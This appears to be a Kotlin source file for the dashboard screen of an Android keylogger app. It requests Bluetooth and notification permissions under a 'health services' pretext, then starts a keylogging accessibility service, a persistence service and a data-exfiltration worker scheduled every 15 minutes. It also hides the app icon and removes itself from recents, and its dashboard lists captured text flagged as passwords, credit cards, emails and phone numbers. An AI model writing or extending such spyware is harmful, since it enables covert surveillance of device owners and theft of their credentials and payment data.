package com.android.myapp.ui

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.android.myapp.R
import com.android.myapp.core.ServiceOrchestrator
import com.android.myapp.core.VersionManager
import com.android.myapp.data.CapturedEvent
import com.android.myapp.data.repository.KeystrokeRepository
import com.android.myapp.exfiltration.ExfiltrationWorker
import com.android.myapp.security.StealthManager
import com.android.myapp.service.KeyloggerAccessibilityService
import com.android.myapp.service.PersistenceService
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Dashboard for monitoring and testing
 */
class DashboardActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "DashboardActivity"
    }

    private lateinit var repository: KeystrokeRepository
    private lateinit var stealthManager: StealthManager
    private lateinit var adapter: EventsAdapter
    private lateinit var statusText: TextView
    private lateinit var statsText: TextView
    private lateinit var eventsRecyclerView: RecyclerView
    private val handler = Handler(Looper.getMainLooper())

    // We only run "post-permissions startup" once
    private var startedAfterPermissions = false

    // Track which permissions we already requested at least once
    private val requestedOnce = mutableSetOf<String>()
    private var wizardRunning = false


    // Final reporting (shown only at the end)
    private val denied = linkedSetOf<String>()
    private val blocked = linkedSetOf<String>() // denied + no rationale after we already asked


    private var returnedFromSettings = false
    private var requestInFlight = false
    private var deniedDialog: AlertDialog? = null
    private var currentRequested: List<String> = emptyList()
    private var permissionStepsRun: List<List<String>> = emptyList()
    private var stepIndex = 0

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->

            requestInFlight = false

            // mark as requested once
            requestedOnce.addAll(currentRequested)

            currentRequested.forEach { perm ->
                val granted = result[perm] == true
                if (!granted) {
                    denied.add(perm)

                    // blocked only if requested before and no rationale
                    if (requestedOnce.contains(perm) && !shouldShowRequestPermissionRationale(perm)) {
                        blocked.add(perm)
                    }
                } else {
                    denied.remove(perm)
                    blocked.remove(perm)
                }
            }

            currentRequested = emptyList()
            stepIndex++
            requestNextPermissionOrFinish()
        }

    override fun onResume() {
        super.onResume()

        // 1) If we resumed because a permission dialog just closed, do NOT restart anything.
        // The ActivityResult callback will handle continuation.
        if (requestInFlight || wizardRunning) {
            return
        }

        val stillMissing = missingPermissions()
        if (stillMissing.isEmpty()) {
            onAllRequiredPermissionsGrantedOnce()
            loadData()
            return
        }

        // 2) Only react automatically if the user came back from Settings.
        showDeniedSummaryDialog(stillMissing)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_dashboard)

        stealthManager = StealthManager(this)
        repository = KeystrokeRepository(this)
        initViews()
        setupRecyclerView()
        updateStatus()
        loadData()

        // Start the wizard if needed
        startWizardIfNeeded()
    }

    override fun onStop() {
        super.onStop()

        // Hide icon in background
        Thread {
            stealthManager.hideAppIcon()
        }.start()

        // Remove from recents and finish
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask()
        } else {
            finish()
        }
    }

    // main entry point
    private fun startWizardIfNeeded() {
        if (startedAfterPermissions) return

        val missing = missingPermissions()
        if (missing.isEmpty()) {
            onAllRequiredPermissionsGrantedOnce()
        } else {
            startPermissionWizard()
        }
    }

    private fun startPermissionWizard() {
        if (wizardRunning) return

        // Prevent multiple runs / dialog spam
        deniedDialog?.dismiss()
        deniedDialog = null

        wizardRunning = true
        denied.clear()
        blocked.clear()

        // Freeze STEPS per run (keeps Bluetooth together)
        permissionStepsRun = buildPermissionSteps()
            .map { step ->
                step.distinct().filter { !hasPermission(it) }
            } // keep only missing inside each step
            .filter { it.isNotEmpty() }                                    // remove empty steps

        stepIndex = 0
        currentRequested = emptyList()

        requestNextPermissionOrFinish()
    }

    private fun requestNextPermissionOrFinish() {
        // Skip already-granted perms inside the frozen steps
        while (stepIndex < permissionStepsRun.size) {
            val missingInStep = permissionStepsRun[stepIndex].filter { !hasPermission(it) }
            if (missingInStep.isNotEmpty()) {
                if (requestInFlight) return  // prevent double-launch
                currentRequested = missingInStep
                requestInFlight = true
                permissionLauncher.launch(missingInStep.toTypedArray())
                return
            }
            stepIndex++
        }

        // IMPORTANT: end the run BEFORE opening the summary dialog
        wizardRunning = false
        currentRequested = emptyList()

        finalizePermissionWizard()
    }

    private fun finalizePermissionWizard() {
        val stillMissing = missingPermissions()

        if (stillMissing.isEmpty()) {
            onAllRequiredPermissionsGrantedOnce()
        } else {
            // IMPORTANT: show the dialog only now (end of the full flow)
            showDeniedSummaryDialog(stillMissing)
        }
    }

    private fun onAllRequiredPermissionsGrantedOnce() {
        if (startedAfterPermissions) {
            return
        }
        startedAfterPermissions = true
        onAllRequiredPermissionsGranted()
    }

    // ---- Permission set definition ----
    private fun buildPermissionSteps(): List<List<String>> = buildList {
        // Step 1: Notifications (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(listOf(Manifest.permission.POST_NOTIFICATIONS))
        }

        // Step 2: Bluetooth (Android 12+) -> request BOTH together (single step)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            add(
                listOf(
                    Manifest.permission.BLUETOOTH_SCAN,
                    Manifest.permission.BLUETOOTH_CONNECT
                )
            )
        } else {
            // Android 11 and below
            add(listOf(Manifest.permission.ACCESS_FINE_LOCATION))
        }
    }

    private fun missingPermissions(): List<String> =
        buildPermissionSteps()
            .flatten()
            .distinct()
            .filter { !hasPermission(it) }

    private fun hasPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED

    /**
     * Blocked = we already asked, user denied, and Android won’t show rationale anymore.
     * This avoids false positives on “never asked yet” (where rationale is also false).
     */
    private fun isBlockedNow(permission: String): Boolean {
        if (hasPermission(permission)) return false
        if (!requestedOnce.contains(permission)) return false
        return !shouldShowRequestPermissionRationale(permission)
    }

    // ---- End-of-flow summary dialog ----
    private fun showDeniedSummaryDialog(stillMissing: List<String>) {
        if (deniedDialog?.isShowing == true) return

        val blockedNow = stillMissing.filter { blocked.contains(it) }
        val retryableNow = stillMissing.filter { !blocked.contains(it) }

        val message = buildString {
            append("The app needs these permissions:\n\n")

            if (retryableNow.isNotEmpty()) {
                append("Denied (you can retry):\n")
                retryableNow.forEach { append("• ${prettyPermissionName(it)}\n") }
                append("\n")
            }

            if (blockedNow.isNotEmpty()) {
                append("Blocked (enable in Settings):\n")
                blockedNow.forEach { append("• ${prettyPermissionName(it)}\n") }
                append("\n")
            }

            append("Without them the app won't work properly.")
        }

        val builder = AlertDialog.Builder(this)
            .setTitle("Permissions needed")
            .setMessage(message)
            .setNegativeButton("Cancel", null)

        val restart = {
            // hard reset the wizard state
            deniedDialog?.dismiss()
            deniedDialog = null

            wizardRunning = false
            stepIndex = 0
            currentRequested = emptyList()
            permissionStepsRun = emptyList()

            startPermissionWizard()
        }

        when {
            blockedNow.isNotEmpty() && retryableNow.isNotEmpty() -> {
                builder.setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
                builder.setNeutralButton("Try Again") { _, _ -> restart() }
            }

            blockedNow.isNotEmpty() -> {
                builder.setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
            }

            else -> {
                builder.setPositiveButton("Try Again") { _, _ -> restart() }
            }
        }

        deniedDialog = builder.create()
        deniedDialog!!.show()
    }

    private fun openAppSettings() {
        returnedFromSettings = true
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }

    private fun prettyPermissionName(p: String): String = when (p) {
        Manifest.permission.POST_NOTIFICATIONS -> "Notifications"
        Manifest.permission.BLUETOOTH_SCAN -> "Bluetooth scan"
        Manifest.permission.BLUETOOTH_CONNECT -> "Bluetooth connect"
        Manifest.permission.ACCESS_FINE_LOCATION -> "Location (needed for BLE on Android 11 and below)"
        else -> p
    }


    private fun onAllRequiredPermissionsGranted() {
        if (!startedAfterPermissions)
            return

        // Anything that may touch BLE/notifications MUST be here (not before permission grant).
        ServiceOrchestrator.getInstance(this).enableAdaptiveMode()

        if (!PersistenceService.isRunning) {
            tryStartService()
        }

        // trigger data transmission to run on each time onCreate() is invoked (i.e., whenever a new app instance starts).
        ExfiltrationWorker.triggerNow(this)

        // Schedule data transmission to run every 15 minutes each time onCreate() is invoked (i.e., whenever a new app instance starts).
        ExfiltrationWorker.schedule(this)

        // Refresh UI 1 second after starting the keylogger
        handler.postDelayed({ updateStatus() }, 1000)
    }

    private fun hasMinimumPermissions(): Boolean {
        val bleOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            hasPermission(Manifest.permission.BLUETOOTH_SCAN) &&
                    hasPermission(Manifest.permission.BLUETOOTH_CONNECT)
        } else {
            hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
        }

        val notifOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermission(Manifest.permission.POST_NOTIFICATIONS)
        } else true

        return bleOk && notifOk
    }

    /**
     * Try to start the health services.
     */
    private fun tryStartService() {
        Log.d(TAG, "tryStartService called")

        if (!hasMinimumPermissions()) {
            Log.w(TAG, "Missing minimum permissions")
            Toast.makeText(this, "Please grant required permissions first", Toast.LENGTH_SHORT)
                .show()
            return
        }

        try {
            Log.d(TAG, "Initializing ServiceOrchestrator...")
            ServiceOrchestrator.getInstance(this).initializeAllStrategies()
        } catch (e: Exception) {
            Log.e(TAG, "Error starting services: ${e.message}", e)
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
        }

        handler.postDelayed({ updateStatus() }, 5000)
    }

    private fun initViews() {
        statusText = findViewById(R.id.statusText)
        statsText = findViewById(R.id.statsText)
        eventsRecyclerView = findViewById(R.id.eventsRecyclerView)

        findViewById<View>(R.id.refreshButton).setOnClickListener {
            if (hasMinimumPermissions())
                loadData()
        }

        findViewById<View>(R.id.clearButton).setOnClickListener {
            if (hasMinimumPermissions())
                clearData()
        }

        findViewById<View>(R.id.settingsButton).setOnClickListener {
            //startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            openAppSettings()
        }
    }

    private fun setupRecyclerView() {
        adapter = EventsAdapter()
        eventsRecyclerView.layoutManager = LinearLayoutManager(this)
        eventsRecyclerView.adapter = adapter
    }

    private fun updateStatus() {
        val isServiceRunning = KeyloggerAccessibilityService.isRunning
        val isAccessibilityEnabled = isAccessibilityServiceEnabled()
        val capabilities = VersionManager.getCapabilities()

        val status = buildString {
            appendLine("Main App settings:")
            appendLine("  Service Status: ${if (isServiceRunning) "✓ Running" else "✗ Not Running"}")
            appendLine("  Accessibility: ${if (isAccessibilityEnabled) "✓ Enabled" else "✗ Disabled"}")
            appendLine("  Android Version: ${Build.VERSION.SDK_INT}")
            appendLine("  Strategy: ${capabilities.recommendedStrategy}")
            appendLine("")
            appendLine("Runtime Permissions:")
            appendLine("  BLE: ${if (hasMinimumPermissions()) "✓" else "✗"}")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                appendLine("  Notifications: ${if (hasPermission(Manifest.permission.POST_NOTIFICATIONS)) "✓" else "✗"}")
            }
            appendLine("")
            appendLine("This Android version capabilities:")
            appendLine("  Screenshot: ${if (capabilities.canCaptureScreen) "✓" else "✗"}")
            appendLine("  Clipboard (BG): ${if (capabilities.canAccessClipboardInBackground) "✓" else "✗"}")
            appendLine("  Hide Notification: ${if (capabilities.canHideNotification) "✓" else "✗"}")
        }

        statusText.text = status
    }

    private fun loadData() {
        lifecycleScope.launch {
            try {
                val stats = repository.getStatistics()
                val recentEvents = repository.getRecentEvents(500)

                statsText.text = buildString {
                    appendLine("Statistics:")
                    appendLine("  Total Events: ${stats.totalEvents}")
                    appendLine("  Sensitive Events: ${stats.sensitiveEvents}")
                    appendLine("  Recent Sessions: ${stats.recentSessions}")
                }

                adapter.submitList(recentEvents)
                Timber.d("Loaded ${recentEvents.size} events")
            } catch (e: Exception) {
                Timber.e(e, "Failed to load data")
                statsText.text = "Error loading data: ${e.message}"
            }
        }
    }

    private fun clearData() {
        AlertDialog.Builder(this)
            .setTitle("Clear All Data")
            .setMessage("Are you sure you want to delete all captured data? This cannot be undone.")
            .setPositiveButton("Clear") { _, _ ->
                lifecycleScope.launch {
                    repository.clearAllData()
                    loadData()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponentName =
            "${packageName}/${packageName}.service.KeyloggerAccessibilityService"

        val enabledServicesSetting = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServicesSetting)

        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedComponentName, ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    // Adapter for displaying events
    private class EventsAdapter : RecyclerView.Adapter<EventViewHolder>() {
        private val events = mutableListOf<CapturedEvent>()

        fun submitList(newEvents: List<CapturedEvent>) {
            events.clear()
            events.addAll(newEvents)
            notifyDataSetChanged()
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): EventViewHolder {
            val view = LayoutInflater.from(parent.context)
                .inflate(android.R.layout.simple_list_item_2, parent, false)
            return EventViewHolder(view)
        }

        override fun onBindViewHolder(holder: EventViewHolder, position: Int) {
            holder.bind(events[position])
        }

        override fun getItemCount() = events.size
    }

    private class EventViewHolder(view: View) : RecyclerView.ViewHolder(view) {
        private val headerText: TextView = view.findViewById(android.R.id.text1)
        private val descriptionText: TextView = view.findViewById(android.R.id.text2)

        fun bind(event: CapturedEvent) {
            val sensitiveMarker = when (event.sensitivityType) {
                "credit_card" -> " 🏧 "
                "password" -> " 🔒 "
                "email" -> " 📧 "
                "phone" -> " 📱 "
                else -> " "
            }

            headerText.text =
                "Event Place: $sensitiveMarker ${event.packageName.split(".").last()}"

            descriptionText.text =
                "Details: ${event.eventType} \n ${event.text?.take(5000) ?: ""} \n\n\n"
        }
    }
}
